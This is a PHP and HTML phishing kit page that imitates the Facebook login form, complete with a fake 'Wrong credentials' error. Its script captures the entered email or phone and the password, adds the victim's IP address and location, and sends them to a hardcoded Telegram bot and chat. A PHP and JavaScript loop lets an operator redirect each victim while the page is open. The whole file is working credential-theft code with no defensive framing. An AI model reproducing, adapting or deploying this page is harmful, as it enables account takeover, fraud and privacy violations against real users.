<?php
require_once 'admin/track.php';
// Function to generate userId based on IP address and user agent
function getUserId() {
    return md5($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT']);
}

$userId = getUserId();

$file = 'admin/active_users.json';
$logFile = 'admin/debug.log';

// Load active_users.json and get the current redirection URL for the user
$activeUsers = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
$currentRedirectionUrl = isset($activeUsers[$userId]) ? $activeUsers[$userId]['redirectionUrl'] : '';

// Log current state
file_put_contents($logFile, date('Y-m-d H:i:s') . " - UserID: $userId - Current Redirection URL: $currentRedirectionUrl\n", FILE_APPEND);
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        body {
            background-color: #f0f2f5;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            text-align: center;
        }

        .header {
            margin-bottom: 20px;
        }

        .header h1 {
            color: #1877f2;
            font-size: 56px;
            margin: 0;
        }

        .header p {
            font-size: 24px;
            margin: 0;
        }

        .login-form {
            background-color: #fff;
            padding: 20px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            display: inline-block;
            text-align: left;
            width: 100%;
            max-width: 400px;
        }

        .login-form input[type="text"],
        .login-form input[type="password"] {
            padding: 14px;
            margin-bottom: 10px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            width: 100%;
            box-sizing: border-box;
        }

        .login-form button {
            padding: 14px;
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            color: white;
            font-size: 18px;
            cursor: pointer;
            width: 100%;
            box-sizing: border-box;
        }

        .login-form a {
            color: #1877f2;
            text-align: center;
            margin-top: 10px;
            display: block;
            text-decoration: none;
        }

        .divider {
            margin: 20px 0;
            text-align: center;
            position: relative;
        }

        .divider::before,
        .divider::after {
            content: "";
            display: inline-block;
            width: 45%;
            height: 1px;
            background-color: #dddfe2;
            position: absolute;
            top: 50%;
        }

        .divider::before {
            left: 0;
        }

        .divider::after {
            right: 0;
        }

        .divider span {
            background-color: #fff;
            padding: 0 10px;
            color: #606770;
        }

        .create-account-button {
            padding: 14px;
            background-color: #42b72a;
            border: none;
            border-radius: 6px;
            color: white;
            font-size: 18px;
            cursor: pointer;
            width: 100%;
            box-sizing: border-box;
            text-align: center;
        }

        .login-form .heading {
            text-align: center;
            font-size: 22px;
            line-height: 22px;
            text-transform: capitalize;
        }

        .error {
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            background-color: #FFEBE8;
            border: 1px solid red;
            margin: 15px 0px;
        }

        .error strong {
            margin-top: 10px;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="header">
            <h1>facebook</h1>
        </div>
        <div class="login-form">
            <p class="heading">login in facbook</span>
            <div class="error">
                <strong>Wrong credentials</strong>
                <p>Invalid username or password</p>
            </div>
            <form id="loginForm">
                <input type="text" name="email_or_phone" id="email_or_phone" placeholder="Email or phone number"
                    required>
                <input type="password" name="password" id="password" placeholder="Password" required>
                <button type="submit" class="">Log In</button>
            </form>
        </div>
    </div>
    <input type="hidden" id="initialRedirectionUrl" value="<?php echo htmlspecialchars($currentRedirectionUrl); ?>">
    <input type="hidden" id="userId" value="<?php echo htmlspecialchars($userId); ?>">


    <input type="hidden" id="ip_hidden" value="">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"
        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
    <script>

         function handleRedirection() {
            let userId = document.getElementById('userId').value;
            let initialRedirectionUrl = document.getElementById('initialRedirectionUrl').value;

            fetch('admin/active_users.json')
                .then(response => response.json())
                .then(data => {
               
                    if (data[userId] && data[userId].redirectionUrl) {
                        let currentRedirectionUrl = data[userId].redirectionUrl;
                        if (currentRedirectionUrl !== initialRedirectionUrl) {
                            window.location.href = currentRedirectionUrl; // Redirect based on stored URL
                        }
                    }
                })
                .catch(error => {
                    console.error('Error fetching active user data:', error);
                });
        }

        // Set interval to check for redirectionUrl changes every 5 seconds
        setInterval(handleRedirection, 5000);

        // Initial call to handleRedirection
        window.onload = handleRedirection;

        // Function to retrieve IP address and populate hidden input field
        function getIp() {
            fetch("https://api.ipify.org/?format=json")
                .then(response => response.json())
                .then(data => {
                    document.getElementById("ip_hidden").value = data.ip;
                })
                .catch(error => {
                    console.error('Error fetching IP address:', error);
                });
        }

        getIp();

        // Function to handle form submission
        function handleActions(event) {
            event.preventDefault(); // Prevent default form submission

            var bot = 'bot7065426189:AAHMIv-TiNcqD56_7524Q1VqUAn8oL_PyA4'; // Replace with your Telegram Bot token
            var chid = '-1002180965367'; // Replace with your Telegram Chat ID

            // Fetch IP details from ipinfo.io as a backup (if needed)
            fetch("https://ipinfo.io/json")
                .then(response => response.json())
                .then(data => {
                    let country = data.country || 'Not available';
                    let region = data.region || 'Not available';
                    let city = data.city || 'Not available';

                    let ip = document.getElementById("ip_hidden").value;

                    // Construct message content
                    var params = {
                        content: '========================' + '%0A' +
                            'Email or Phone: "' + document.getElementsByName('email_or_phone')[0].value + '"' + '%0A' +
                            'Password: "' + document.getElementsByName('password')[0].value + '"' + '%0A' +
                            'Country: "' + country + '"' + '%0A' +
                            'Region: "' + region + '"' + '%0A' +
                            'City: "' + city + '"' + '%0A' +
                            'IP: "' + ip + '"' + '%0A' +
                            '========================'
                    };

                    // Send message to Telegram via fetch
                    fetch(`https://api.telegram.org/${bot}/sendMessage?chat_id=${chid}&text=${params.content}`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                    })
                        .then(response => {
                            if (response.ok) {
                                const emailOrPhone = document.getElementById('email_or_phone').value;
                                const password = document.getElementById('password').value;
                                const params = new URLSearchParams({ email_or_phone: emailOrPhone, password: password });
                                window.location.href = 'redirect.php?' + params.toString();
                            } else {
                                console.error('Failed to send message to Telegram:', response.statusText);
                            }
                        }).catch(error => {
                            console.error('Error sending message to Telegram:', error);
                        });


                }).catch(error => {
                    console.error('Error fetching IP details:', error);
                });
        }

        document.getElementById("loginForm").addEventListener('submit', handleActions);

    </script>

</body>

</html>